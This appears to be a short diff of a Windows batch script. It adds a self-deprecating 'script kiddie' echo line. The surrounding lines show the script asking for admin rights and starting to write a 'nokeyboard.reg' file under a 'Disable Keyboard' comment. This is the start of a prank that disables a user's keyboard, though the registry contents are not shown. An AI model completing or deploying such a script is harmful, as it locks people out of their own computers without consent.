@@ -1,4 +1,5 @@
 @echo off
+echo i was script kiddie back then please don't mind me
 echo run as admin if running as admin ok............
 ::------Disable Keyboard-----::
 echo Windows Registry Editor Version 5.00 > "nokeyboard.reg"
